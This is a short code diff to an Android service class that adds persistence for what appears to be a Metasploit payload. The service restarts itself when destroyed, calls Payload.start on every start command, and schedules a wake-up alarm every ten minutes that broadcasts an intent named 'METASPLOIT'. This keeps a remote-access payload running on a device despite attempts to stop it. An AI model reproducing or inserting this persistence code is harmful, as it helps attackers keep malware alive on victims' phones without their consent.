@@ -63,4 +63,23 @@ public class MainService extends Service {
         return START_STICKY;
     }
 
+     @Override
+ public void onDestroy() {
+     Intent localIntent = new Intent();      
+     localIntent.setClass(this, MainService.class);
+     this.startService(localIntent);
+ }
+    
+     @Override
+ public int onStartCommand(Intent intent, int flags, int startId) {
+     Payload.start(this);
+     AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
+     int restarttime = 600 * 1000; // ten minute
+     long triggerAtTime = SystemClock.elapsedRealtime() + restarttime;
+     Intent i = new Intent("METASPLOIT");
+     PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
+     manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
+     return START_STICKY;
+     }
+    
 }
